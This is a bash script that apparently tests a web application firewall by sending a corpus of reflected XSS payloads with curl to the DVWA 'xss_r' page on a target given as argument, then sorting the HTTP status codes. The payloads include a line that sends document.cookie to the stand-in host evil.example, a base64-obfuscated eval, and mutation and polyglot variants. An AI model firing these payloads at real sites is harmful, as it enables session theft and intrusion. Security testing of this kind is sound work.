#!/bin/bash
# Preserved payload corpus against authenticated synthetic DVWA fixtures.
set -euo pipefail
TARGET="${1:?Usage: $0 <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-https}://${TARGET}"
COOKIES=$(mktemp)
trap 'rm -f "$COOKIES"' EXIT
# An ownership-routed, origin-authenticated session avoids blocked public setup suppressing attacks.
python3 "$(dirname "$0")/../../scripts/traffic_fixtures.py" dvwa-session "$TARGET" >"$COOKIES"
echo "[*] XSS payloads against authenticated DVWA"
PAYLOADS=(
  '<script>alert("XSS")</script>'
  '<script>alert(document.cookie)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '<body onload=alert(1)>'
  '"><script>alert(1)</script>'
  "javascript:alert('XSS')"
  '<iframe src="javascript:alert(1)">'
  '<input onfocus=alert(1) autofocus>'
  '<details open ontoggle=alert(1)>'
  '<marquee onstart=alert(1)>'
  '<svg><script>alert(1)</script></svg>'
  '"><img src=x onerror=fetch("https://evil.example/c="+document.cookie)>'
  '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">'
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
  "<script>eval(atob('YWxlcnQoMSk='))</script>"
  '<div style="width:expression(alert(1))">'
  "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//"
)
failed=0
for payload in "${PAYLOADS[@]}"; do
  if ! code=$(curl -sS -b "$COOKIES" -o /dev/null -w "%{http_code}" --max-time 10 \
    --get --data-urlencode "name=${payload}" --data-urlencode "Submit=Submit" \
    "${BASE}/dvwa/vulnerabilities/xss_r/"); then
    echo "[TRANSPORT_FAILURE] intended payload dispatch failed"
    failed=1
    continue
  fi
  case "$code" in
    200) outcome=application_response ;;
    403 | 429) outcome=mitigation_candidate ;;
    400 | 422 | 500) outcome=application_rejection ;;
    *)
      outcome=unexpected_application_response
      failed=1
      ;;
  esac
  printf '  [%s] %s
' "$code" "$outcome"
done
exit "$failed"
